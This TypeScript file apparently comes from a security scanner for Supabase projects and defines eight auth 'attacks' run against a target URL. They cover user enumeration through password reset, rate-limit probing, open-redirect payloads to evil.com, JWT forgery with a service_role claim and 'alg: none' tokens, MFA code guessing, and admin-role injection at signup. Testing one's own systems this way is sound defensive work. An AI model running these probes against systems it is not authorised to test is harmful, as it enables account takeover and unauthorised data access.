/**
 * Supabase Auth Edge Cases Attacks
 * Tests for authentication bypasses and edge case vulnerabilities
 */

import type { AttackVector, AttackContext, AttackResult } from '$lib/types/attacks';

export const authEdgeCasesAttacks: AttackVector[] = [
	{
		id: 'auth-magic-link-entropy',
		name: 'Magic Link Token Entropy Analysis',
		description: 'Analyzes magic link tokens for predictability and weak entropy',
		category: 'auth',
		severity: 'high',
		tags: ['magic-link', 'entropy', 'token', 'prediction'],
		async execute(ctx: AttackContext): Promise<AttackResult> {
			const findings: string[] = [];
			let breached = false;

			// Check if magic link endpoint is accessible
			const authUrl = ctx.targetUrl.replace('/rest/v1', '/auth/v1');

			try {
				// Request a magic link to analyze the token format
				const res = await fetch(`${authUrl}/magiclink`, {
					method: 'POST',
					headers: {
						'apikey': ctx.anonKey,
						'Content-Type': 'application/json'
					},
					body: JSON.stringify({
						email: `test-entropy-${Date.now()}@example.com`
					}),
					signal: ctx.signal
				});

				if (res.ok || res.status === 429) {
					// Check response headers for info leakage
					const headers = Object.fromEntries(res.headers.entries());
					if (headers['x-request-id']) {
						findings.push('Request ID exposed in headers - could aid token prediction');
					}
				}

				// Check if OTP is being used (shorter, more predictable)
				const otpRes = await fetch(`${authUrl}/otp`, {
					method: 'POST',
					headers: {
						'apikey': ctx.anonKey,
						'Content-Type': 'application/json'
					},
					body: JSON.stringify({
						email: `test-otp-${Date.now()}@example.com`
					}),
					signal: ctx.signal
				});

				if (otpRes.ok) {
					findings.push('OTP endpoint accessible - 6-digit codes are brute-forceable');
					breached = true;
				}
			} catch {}

			return {
				attackId: 'auth-magic-link-entropy',
				status: breached ? 'breached' : findings.length > 0 ? 'breached' : 'secure',
				breached: breached || findings.length > 0,
				summary: findings.length > 0
					? `Found ${findings.length} magic link security concerns`
					: 'Magic link appears to have adequate entropy',
				details: { findings },
				evidence: findings.length > 0 ? { findings } : undefined
			};
		}
	},

	{
		id: 'auth-password-reset-abuse',
		name: 'Password Reset Flow Abuse',
		description: 'Tests password reset for enumeration, rate limiting, and token issues',
		category: 'auth',
		severity: 'high',
		tags: ['password-reset', 'enumeration', 'rate-limit', 'abuse'],
		async execute(ctx: AttackContext): Promise<AttackResult> {
			const findings: string[] = [];
			let breached = false;

			const authUrl = ctx.targetUrl.replace('/rest/v1', '/auth/v1');

			// Test 1: User enumeration via different responses
			const testEmails = [
				'definitely-not-exists@example.com',
				'admin@' + new URL(ctx.targetUrl).hostname,
				'test@test.com'
			];

			const responses: Array<{ email: string; status: number; bodyLength: number }> = [];

			for (const email of testEmails) {
				try {
					const res = await fetch(`${authUrl}/recover`, {
						method: 'POST',
						headers: {
							'apikey': ctx.anonKey,
							'Content-Type': 'application/json'
						},
						body: JSON.stringify({ email }),
						signal: ctx.signal
					});

					const body = await res.text();
					responses.push({ email, status: res.status, bodyLength: body.length });
				} catch {}
			}

			// Check if responses differ (user enumeration)
			if (responses.length >= 2) {
				const statuses = new Set(responses.map(r => r.status));
				const lengths = new Set(responses.map(r => r.bodyLength));

				if (statuses.size > 1) {
					findings.push('Different status codes for existing/non-existing users - enumeration possible');
					breached = true;
				}

				if (lengths.size > 1) {
					findings.push('Different response lengths for existing/non-existing users - enumeration possible');
					breached = true;
				}
			}

			// Test 2: Rate limiting
			let rateLimitTriggered = false;
			for (let i = 0; i < 10; i++) {
				try {
					const res = await fetch(`${authUrl}/recover`, {
						method: 'POST',
						headers: {
							'apikey': ctx.anonKey,
							'Content-Type': 'application/json'
						},
						body: JSON.stringify({ email: `rate-test-${i}@example.com` }),
						signal: ctx.signal
					});

					if (res.status === 429) {
						rateLimitTriggered = true;
						break;
					}
				} catch {}
			}

			if (!rateLimitTriggered) {
				findings.push('No rate limiting on password reset - abuse possible');
				breached = true;
			}

			return {
				attackId: 'auth-password-reset-abuse',
				status: breached ? 'breached' : 'secure',
				breached,
				summary: breached
					? `Password reset has ${findings.length} security issues!`
					: 'Password reset appears secure',
				details: { findings, responses },
				evidence: breached ? { findings } : undefined
			};
		}
	},

	{
		id: 'auth-email-confirmation-bypass',
		name: 'Email Confirmation Bypass',
		description: 'Tests if email confirmation can be bypassed',
		category: 'auth',
		severity: 'critical',
		tags: ['email', 'confirmation', 'bypass', 'verification'],
		async execute(ctx: AttackContext): Promise<AttackResult> {
			const findings: string[] = [];
			let breached = false;

			const authUrl = ctx.targetUrl.replace('/rest/v1', '/auth/v1');

			// Test 1: Sign up and try to access resources without confirmation
			const testEmail = `bypass-test-${Date.now()}@example.com`;
			const testPassword = 'TestPassword123!';

			try {
				// Sign up
				const signupRes = await fetch(`${authUrl}/signup`, {
					method: 'POST',
					headers: {
						'apikey': ctx.anonKey,
						'Content-Type': 'application/json'
					},
					body: JSON.stringify({
						email: testEmail,
						password: testPassword
					}),
					signal: ctx.signal
				});

				if (signupRes.ok) {
					const signupData = await signupRes.json();

					// Check if we got an access token immediately (confirmation disabled)
					if (signupData.access_token) {
						findings.push('CRITICAL: Access token granted without email confirmation!');
						breached = true;

						// Test if this token can access protected resources
						const profileRes = await fetch(`${ctx.targetUrl}/rest/v1/profiles?select=*&limit=1`, {
							headers: {
								'apikey': ctx.anonKey,
								'Authorization': `Bearer ${signupData.access_token}`,
								'Content-Type': 'application/json'
							},
							signal: ctx.signal
						});

						if (profileRes.ok) {
							findings.push('Unconfirmed user can access protected resources!');
						}
					}

					// Check user metadata
					if (signupData.user?.email_confirmed_at) {
						findings.push('Email marked as confirmed immediately - auto-confirm enabled');
						breached = true;
					}
				}
			} catch {}

			// Test 2: Check if verification endpoint is predictable
			try {
				const verifyRes = await fetch(`${authUrl}/verify?type=signup&token=test`, {
					method: 'GET',
					headers: {
						'apikey': ctx.anonKey
					},
					signal: ctx.signal
				});

				if (verifyRes.status !== 400 && verifyRes.status !== 401) {
					findings.push('Verify endpoint responds unusually - may be exploitable');
				}
			} catch {}

			return {
				attackId: 'auth-email-confirmation-bypass',
				status: breached ? 'breached' : 'secure',
				breached,
				summary: breached
					? 'Email confirmation can be bypassed!'
					: 'Email confirmation appears properly enforced',
				details: { findings },
				evidence: breached ? { findings } : undefined
			};
		}
	},

	{
		id: 'auth-redirect-url-bypass',
		name: 'Redirect URL Whitelist Bypass',
		description: 'Tests for open redirect vulnerabilities in auth flow',
		category: 'auth',
		severity: 'high',
		tags: ['redirect', 'open-redirect', 'whitelist', 'bypass'],
		async execute(ctx: AttackContext): Promise<AttackResult> {
			const findings: string[] = [];
			let breached = false;

			const authUrl = ctx.targetUrl.replace('/rest/v1', '/auth/v1');

			// Malicious redirect URLs to test
			const maliciousRedirects = [
				'https://evil.com',
				'https://evil.com@legitimate.com',
				'https://legitimate.com.evil.com',
				'//evil.com',
				'https://evil.com?legitimate.com',
				'javascript:alert(1)',
				'data:text/html,<script>alert(1)</script>',
				'https://legitimate.com/..%2f..%2fevil.com',
				'https://legitimate.com%00.evil.com'
			];

			for (const redirect of maliciousRedirects) {
				try {
					// Test magic link with redirect
					const res = await fetch(`${authUrl}/magiclink`, {
						method: 'POST',
						headers: {
							'apikey': ctx.anonKey,
							'Content-Type': 'application/json'
						},
						body: JSON.stringify({
							email: 'test@example.com',
							options: {
								redirectTo: redirect
							}
						}),
						signal: ctx.signal
					});

					// If we get 200 instead of 400/422, redirect might be accepted
					if (res.ok) {
						findings.push(`Potentially accepted malicious redirect: ${redirect}`);
						breached = true;
					}
				} catch {}
			}

			// Test OAuth redirect
			try {
				const oauthRes = await fetch(`${authUrl}/authorize?provider=google&redirect_to=https://evil.com`, {
					method: 'GET',
					headers: {
						'apikey': ctx.anonKey
					},
					redirect: 'manual',
					signal: ctx.signal
				});

				if (oauthRes.status === 302 || oauthRes.status === 301) {
					const location = oauthRes.headers.get('location');
					if (location?.includes('evil.com')) {
						findings.push('OAuth redirect accepts arbitrary URLs!');
						breached = true;
					}
				}
			} catch {}

			return {
				attackId: 'auth-redirect-url-bypass',
				status: breached ? 'breached' : 'secure',
				breached,
				summary: breached
					? `Found ${findings.length} redirect bypass vulnerabilities!`
					: 'Redirect URL whitelist appears secure',
				details: { findings },
				evidence: breached ? { findings } : undefined
			};
		}
	},

	{
		id: 'auth-session-fixation',
		name: 'Session Fixation Attack',
		description: 'Tests if session tokens can be fixed/reused improperly',
		category: 'auth',
		severity: 'high',
		tags: ['session', 'fixation', 'token', 'reuse'],
		async execute(ctx: AttackContext): Promise<AttackResult> {
			const findings: string[] = [];
			let breached = false;

			const authUrl = ctx.targetUrl.replace('/rest/v1', '/auth/v1');

			// Test 1: Check if refresh token can be reused after logout
			try {
				// Get initial session (anonymous)
				const sessionRes = await fetch(`${authUrl}/token?grant_type=refresh_token`, {
					method: 'POST',
					headers: {
						'apikey': ctx.anonKey,
						'Content-Type': 'application/json'
					},
					body: JSON.stringify({
						refresh_token: 'test-refresh-token'
					}),
					signal: ctx.signal
				});

				const sessionData = await sessionRes.json();
				if (sessionData.error?.message?.includes('not found') === false) {
					findings.push('Refresh token endpoint may accept arbitrary tokens');
				}
			} catch {}

			// Test 2: Check session cookie settings
			try {
				const res = await fetch(ctx.targetUrl, {
					headers: {
						'apikey': ctx.anonKey
					},
					credentials: 'include',
					signal: ctx.signal
				});

				const cookies = res.headers.get('set-cookie');
				if (cookies) {
					if (!cookies.includes('HttpOnly')) {
						findings.push('Session cookie missing HttpOnly flag');
						breached = true;
					}
					if (!cookies.includes('Secure')) {
						findings.push('Session cookie missing Secure flag');
					}
					if (!cookies.includes('SameSite')) {
						findings.push('Session cookie missing SameSite attribute');
						breached = true;
					}
				}
			} catch {}

			// Test 3: Check if old tokens are invalidated on password change
			// (Can't fully test without valid credentials, but can check behavior)

			return {
				attackId: 'auth-session-fixation',
				status: breached ? 'breached' : findings.length > 0 ? 'breached' : 'secure',
				breached: breached || findings.length > 0,
				summary: findings.length > 0
					? `Found ${findings.length} session security issues`
					: 'Session handling appears secure',
				details: { findings },
				evidence: findings.length > 0 ? { findings } : undefined
			};
		}
	},

	{
		id: 'auth-mfa-bypass',
		name: 'MFA Bypass Attempts',
		description: 'Tests for multi-factor authentication bypass vulnerabilities',
		category: 'auth',
		severity: 'critical',
		tags: ['mfa', '2fa', 'bypass', 'authentication'],
		async execute(ctx: AttackContext): Promise<AttackResult> {
			const findings: string[] = [];
			let breached = false;

			const authUrl = ctx.targetUrl.replace('/rest/v1', '/auth/v1');

			// Test 1: Check if MFA can be skipped by not providing code
			try {
				const loginRes = await fetch(`${authUrl}/token?grant_type=password`, {
					method: 'POST',
					headers: {
						'apikey': ctx.anonKey,
						'Content-Type': 'application/json'
					},
					body: JSON.stringify({
						email: 'test@example.com',
						password: 'testpassword'
						// Intentionally not providing MFA code
					}),
					signal: ctx.signal
				});

				const data = await loginRes.json();
				if (data.access_token && !data.mfa_required) {
					findings.push('Login succeeded without MFA challenge');
				}
			} catch {}

			// Test 2: Check MFA enrollment status exposure
			try {
				const factorsRes = await fetch(`${authUrl}/factors`, {
					method: 'GET',
					headers: {
						'apikey': ctx.anonKey,
						'Authorization': `Bearer ${ctx.anonKey}`
					},
					signal: ctx.signal
				});

				if (factorsRes.ok) {
					findings.push('MFA factors endpoint accessible - may leak enrollment status');
					breached = true;
				}
			} catch {}

			// Test 3: Check if MFA code is brute-forceable (TOTP codes)
			let mfaRateLimited = false;
			try {
				for (let i = 0; i < 5; i++) {
					const verifyRes = await fetch(`${authUrl}/factors/test-id/verify`, {
						method: 'POST',
						headers: {
							'apikey': ctx.anonKey,
							'Authorization': `Bearer ${ctx.anonKey}`,
							'Content-Type': 'application/json'
						},
						body: JSON.stringify({ code: '000000' }),
						signal: ctx.signal
					});

					if (verifyRes.status === 429) {
						mfaRateLimited = true;
						break;
					}
				}

				if (!mfaRateLimited) {
					findings.push('MFA verification not rate-limited - brute force possible');
					breached = true;
				}
			} catch {}

			return {
				attackId: 'auth-mfa-bypass',
				status: breached ? 'breached' : 'secure',
				breached,
				summary: breached
					? `Found ${findings.length} MFA security issues!`
					: 'MFA appears properly implemented',
				details: { findings },
				evidence: breached ? { findings } : undefined
			};
		}
	},

	{
		id: 'auth-jwt-manipulation',
		name: 'JWT Token Manipulation',
		description: 'Tests JWT tokens for manipulation vulnerabilities',
		category: 'auth',
		severity: 'critical',
		tags: ['jwt', 'manipulation', 'forgery', 'algorithm'],
		async execute(ctx: AttackContext): Promise<AttackResult> {
			const findings: string[] = [];
			let breached = false;

			// Decode and analyze the anon key (it's a JWT)
			try {
				const parts = ctx.anonKey.split('.');
				if (parts.length === 3) {
					const header = JSON.parse(atob(parts[0]));
					const payload = JSON.parse(atob(parts[1]));

					// Check algorithm
					if (header.alg === 'none') {
						findings.push('CRITICAL: JWT uses "none" algorithm - forgery trivial!');
						breached = true;
					} else if (header.alg === 'HS256') {
						// Test if we can use the key as the secret (common mistake)
						findings.push('JWT uses HS256 - verify secret is not predictable');
					}

					// Create a manipulated token with elevated role
					const manipulatedPayload = {
						...payload,
						role: 'service_role',
						is_super_admin: true
					};

					const manipulatedToken = [
						parts[0],
						btoa(JSON.stringify(manipulatedPayload)),
						parts[2]
					].join('.');

					// Test if manipulated token is accepted
					const testRes = await fetch(`${ctx.targetUrl}/rest/v1/users?select=*&limit=1`, {
						headers: {
							'apikey': ctx.anonKey,
							'Authorization': `Bearer ${manipulatedToken}`,
							'Content-Type': 'application/json'
						},
						signal: ctx.signal
					});

					if (testRes.ok) {
						const data = await testRes.json();
						if (Array.isArray(data) && data.length > 0) {
							findings.push('CRITICAL: Manipulated JWT token accepted!');
							breached = true;
						}
					}

					// Test "alg: none" attack
					const noneToken = [
						btoa(JSON.stringify({ alg: 'none', typ: 'JWT' })),
						btoa(JSON.stringify({ ...payload, role: 'service_role' })),
						''
					].join('.');

					const noneRes = await fetch(`${ctx.targetUrl}/rest/v1/users?select=*&limit=1`, {
						headers: {
							'apikey': ctx.anonKey,
							'Authorization': `Bearer ${noneToken}`,
							'Content-Type': 'application/json'
						},
						signal: ctx.signal
					});

					if (noneRes.ok) {
						const data = await noneRes.json();
						if (Array.isArray(data) && data.length > 0) {
							findings.push('CRITICAL: "alg: none" attack successful!');
							breached = true;
						}
					}
				}
			} catch {}

			return {
				attackId: 'auth-jwt-manipulation',
				status: breached ? 'breached' : findings.length > 0 ? 'breached' : 'secure',
				breached: breached || findings.length > 0,
				summary: breached
					? 'JWT manipulation vulnerabilities found!'
					: findings.length > 0
						? `${findings.length} JWT concerns identified`
						: 'JWT appears properly validated',
				details: { findings },
				evidence: findings.length > 0 ? { findings } : undefined
			};
		}
	},

	{
		id: 'auth-anonymous-privilege-escalation',
		name: 'Anonymous to Authenticated Escalation',
		description: 'Tests if anonymous users can escalate to authenticated role',
		category: 'auth',
		severity: 'critical',
		tags: ['privilege-escalation', 'anonymous', 'authenticated', 'role'],
		async execute(ctx: AttackContext): Promise<AttackResult> {
			const findings: string[] = [];
			let breached = false;

			const authUrl = ctx.targetUrl.replace('/rest/v1', '/auth/v1');

			// Test 1: Can we self-register and get elevated privileges?
			try {
				const signupRes = await fetch(`${authUrl}/signup`, {
					method: 'POST',
					headers: {
						'apikey': ctx.anonKey,
						'Content-Type': 'application/json'
					},
					body: JSON.stringify({
						email: `escalation-test-${Date.now()}@example.com`,
						password: 'TestPassword123!',
						data: {
							role: 'admin',
							is_admin: true,
							is_super_admin: true
						}
					}),
					signal: ctx.signal
				});

				if (signupRes.ok) {
					const data = await signupRes.json();
					if (data.user?.user_metadata?.role === 'admin' ||
					    data.user?.user_metadata?.is_admin === true) {
						findings.push('CRITICAL: Can set admin role via user_metadata!');
						breached = true;
					}
				}
			} catch {}

			// Test 2: Check if anonymous user can access authenticated endpoints
			const authOnlyEndpoints = [
				'/auth/v1/user',
				'/auth/v1/factors',
				'/auth/v1/mfa/enroll',
				'/rest/v1/rpc/get_current_user'
			];

			for (const endpoint of authOnlyEndpoints) {
				try {
					const url = endpoint.startsWith('/auth')
						? ctx.targetUrl.replace('/rest/v1', '') + endpoint
						: ctx.targetUrl.replace('/rest/v1', '') + endpoint;

					const res = await fetch(url, {
						headers: {
							'apikey': ctx.anonKey,
							'Authorization': `Bearer ${ctx.anonKey}`,
							'Content-Type': 'application/json'
						},
						signal: ctx.signal
					});

					if (res.ok) {
						findings.push(`Authenticated endpoint accessible anonymously: ${endpoint}`);
						breached = true;
					}
				} catch {}
			}

			return {
				attackId: 'auth-anonymous-privilege-escalation',
				status: breached ? 'breached' : 'secure',
				breached,
				summary: breached
					? `${findings.length} privilege escalation vectors found!`
					: 'No privilege escalation possible',
				details: { findings },
				evidence: breached ? { findings } : undefined
			};
		}
	}
];
